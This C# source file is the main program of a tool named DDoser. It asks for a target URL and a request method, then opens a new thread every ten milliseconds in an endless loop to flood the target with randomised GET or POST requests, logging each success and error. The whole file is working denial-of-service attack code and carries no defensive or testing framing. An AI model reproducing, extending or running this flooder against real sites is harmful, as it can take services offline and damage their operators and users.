using DDoser.Infrastructure.ConsoleInfrastructure;
using DDoser.Infrastructure.QueryString;
using DDoser.Infrastructure.QueryString.Modifiers;
using System;
using System.Linq;
using System.Net;
using System.Text.Encodings.Web;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace DDoser
{
    public class Program
    {
        public static void Main()
        {
            ConsoleHelper.ConsoleInit();

            var url = ConsoleHelper.ReadResponse("Request Url/IP: ");
            var type = ConsoleHelper.ReadResponse("Type[POST/GET]: ");

            var program = new Program();
            switch (type)
            {
                case "GET":
                    StartDDos(program.GetRequest, url);
                    break;
                case "POST":
                    var outgoingQueryString = HttpUtility.ParseQueryString(string.Empty);
                    if (YesOrNo())
                    {
                        while (true)
                        {
                            var key = ConsoleHelper.ReadResponse("Key: ");
                            var value = ConsoleHelper.ReadResponse($"Value(value/{RandomStringHelper.Ancor}/{RandomEmailHelper.Ancor}): ");
                            outgoingQueryString.Add(key, value);

                            if (!YesOrNo())
                                break;
                        }
                        url += "?" + outgoingQueryString.ToString();
                    }
                    StartDDos(program.PostRequestDDos, url);
                    break;
            }
        }

        private static bool YesOrNo()
        {
            while (true)
            {
                Console.Write("Continue(Y/N)? ");
                var result = Console.ReadKey().Key.ToString();
                Console.WriteLine();
                if (result == "Y")
                    return true;
                if (result == "N")
                    return false;
            }
        }

        private HttpWebResponse PostRequestDDos(HttpWebRequest request)
        {
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            return (HttpWebResponse)request.GetResponse();
        }


        private HttpWebResponse GetRequest(HttpWebRequest request)
        {
            request.Method = "GET";
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            return (HttpWebResponse)request.GetResponse();
        }

        #region Routines
        private static void StartDDos(Func<HttpWebRequest, HttpWebResponse> requestAction, string url)
        {
            var counterSuccess = 1; 
            var counterErrors = 1;

            var ct = new CancellationTokenSource(30000).Token;

            while (true)
            {
                new Thread(() => {
                    try
                    {
                        var requestUrl = UrlModifier.ModifyUrl(url);

                        var response = BaseRequest(requestAction, requestUrl, ct);
                        if ((int)response.StatusCode < 400)
                        {
                            ConsoleHelper.WriteColoredLine($"Success: {counterSuccess++} - ({WebUtility.UrlDecode(requestUrl)})", ConsoleColor.Green);
                        }
                        else
                        { 
                            ConsoleHelper.WriteColoredLine($"Error: {counterErrors++} - {response.StatusCode}", ConsoleColor.Red);
                        }
                    }
                    catch (Exception e)
                    {
                        ConsoleHelper.WriteColoredLine($"{e.Message}\n{e.InnerException?.Message}", ConsoleColor.Red);
                        Task.Delay(10000).Wait();
                    }
                }).Start();

                Thread.Sleep(10);
            }
        }

        private static HttpWebResponse BaseRequest(Func<HttpWebRequest, HttpWebResponse> func, string url, CancellationToken ct)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            using (ct.Register(() => request.Abort(), useSynchronizationContext: false))
            {
                try
                {
                    return func(request);
                }
                catch
                {
                    throw;
                }
            }
        }
        #endregion
    }
}
